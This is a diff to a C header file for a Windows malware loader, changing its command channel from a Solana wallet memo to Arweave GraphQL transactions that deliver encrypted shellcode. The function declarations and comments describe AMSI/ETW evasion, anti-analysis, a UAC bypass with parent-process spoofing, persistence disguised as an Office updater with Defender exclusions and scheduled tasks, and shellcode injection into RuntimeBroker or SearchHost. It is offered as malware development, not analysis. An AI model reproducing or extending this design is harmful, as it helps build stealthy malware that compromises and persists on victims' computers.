@@ -11,7 +11,7 @@
 #include "Payload.h"
 
 // ----------- Network Retry -----------
-// Both FetchSolMemo (Solana RPC) and DownloadPayload (payload HTTP fetch)
+// Both FetchArweaveMeta (Arweave GraphQL) and DownloadPayload (payload HTTP fetch)
 // retry on network failure, sleeping NET_RETRY_DELAY_MS between attempts.
 // Allows the loader to survive early-boot network delays (~60-90 s).
 // Total max wait = NET_RETRY_COUNT * NET_RETRY_DELAY_MS = 90 seconds.
@@ -163,7 +163,7 @@ VOID IatCamouflage(VOID);
 
 // ----------- Evasion -----------
 BOOL BlindDllNotifications(IN PAPI_HASHING pApi);
-BOOL PatchlessAmsiEtw(IN PAPI_HASHING pApi);
+BOOL PatchlessEtw(IN PAPI_HASHING pApi);
 VOID CleanupEvasion(IN PAPI_HASHING pApi);
 BOOL AntiAnalysis(VOID);
 BOOL InstallExitHook(IN PVOID pNtdll);
@@ -243,14 +243,30 @@ BOOL DownloadPayload(IN PAPI_HASHING pApi, IN LPCSTR szUrl, OUT PBYTE* ppData, O
 //   suppresses StartupApproved toast, then NtTerminateProcess self.
 // UacRunCommandElevated: acquires elevated ComputerDefaults handle via AppInfo RPC,
 //   then spawns wCommand as child of ComputerDefaults (parent-spoof).
+// InstallAndTerminate: available for all EXE builds.
+// All builds: copies self to %APPDATA%\Microsoft\Office\Updates\msoia.exe.
+//   Self-guard: if basename == msoia.exe (already persistence copy) → return (skip).
+// UAC builds: also runs WD exclusions + scheduled task (elevated PS) before copy,
+//   then launches via RunTaskViaCom, then NtTerminateProcess self.
+// Non-UAC builds: launches msoia.exe directly via CreateProcessW, then NtTerminateProcess self.
+VOID  InstallAndTerminate(IN PAPI_HASHING pApi);
+
 #ifdef UAC_BYPASS
 BOOL  UacBypass(IN PAPI_HASHING pApi);
 BOOL  IsFirstRunProcess(IN PAPI_HASHING pApi);
-VOID  InstallAndTerminate(IN PAPI_HASHING pApi);
 BOOL  UacRunCommandElevated(IN PAPI_HASHING pApi, IN PVOID pNtdll, IN LPWSTR wSysDir, IN LPWSTR wWinDir, IN LPWSTR wCommand);
-#if defined(BUILD_DLL)
-VOID  SideloadInstallAndContinue(IN PAPI_HASHING pApi);
 #endif
+
+#ifdef BUILD_DLL
+// All sideload builds: copies host EXE + *.dll to persist dir, self-guard on reboot path.
+// [UAC only] Also runs WD exclusions + scheduled task via elevated PS.
+VOID  SideloadInstallAndContinue(IN PAPI_HASHING pApi);
+
+// Persistence-reboot injection: writes already-placed shellcode (pShellcode, RX in current
+// process) into a low-CPU target (RuntimeBroker → SearchHost → sihost → dllhost) and
+// calls NtTerminateProcess(-1). Returns FALSE if no target found (caller falls back to
+// thread-pool execution in the current host process).
+BOOL  InjectAndHijack(IN PVOID pShellcode, IN DWORD dwSize);
 #endif
 
 // ----------- Persistence (non-UAC builds only) -----------
@@ -260,20 +276,26 @@ VOID  SideloadInstallAndContinue(IN PAPI_HASHING pApi);
 BOOL InstallPersistence(IN PAPI_HASHING pApi);
 #endif
 
-// ----------- Solana Beacon -----------
-// Decodes the beacon wallet from Payload.h, queries the Solana JSON-RPC
-// API for the wallet's oldest transaction, reads the SPL Memo, and returns:
-//   *ppUrl  — heap-allocated staging URL (caller must HeapFree + wipe)
-//   pKey    — 16-byte Chaskey key (caller-provided KEY_SIZE buffer, wipe after use)
-//   pNonce  — 12-byte Chaskey nonce (caller-provided buffer, wipe after use)
-// Memo format: <url>|<32-hex-key>|<24-hex-nonce>|<decimal-size>|<0-or-1>
-// Payload size + compression flag travel in the memo so the same compiled
-// binary decrypts any future payload without a rebuild.
-BOOL FetchSolMemo(
+// ----------- Arweave Beacon -----------
+// Decodes the Arweave wallet address from Payload.h (XOR-obfuscated), POSTs
+// arweave.net/graphql (owners + App-Name tag + block:{min:1} filters) to fetch
+// confirmed zero-loader transactions from that wallet, GETs each TX and parses
+// the combined-format header:
+//   hex_key|hex_nonce|orig_size|compressed|<binary encrypted payload>
+// The rest of the downloaded bytes IS the payload — no second HTTP call needed.
+// Returns:
+//   *ppPayload     — heap-allocated encrypted payload (caller must HeapFree + wipe)
+//   *pdwPayloadLen — byte length of *ppPayload
+//   pKey           — 16-byte Chaskey key (caller-provided, wipe after use)
+//   pNonce         — 12-byte Chaskey nonce (caller-provided, wipe after use)
+//   *pdwOrigSize   — uncompressed shellcode size
+//   *pbCompressed  — TRUE if LZNT1-compressed before encryption
+BOOL FetchArweaveMeta(
     IN  PAPI_HASHING pApi,
-    OUT PCHAR*       ppUrl,
+    OUT PBYTE*       ppPayload,
+    OUT PDWORD       pdwPayloadLen,
     OUT PBYTE        pKey,
     OUT PBYTE        pNonce,
-    OUT PDWORD       pdwPayloadSize,
+    OUT PDWORD       pdwOrigSize,
     OUT PBOOL        pbCompressed
 );
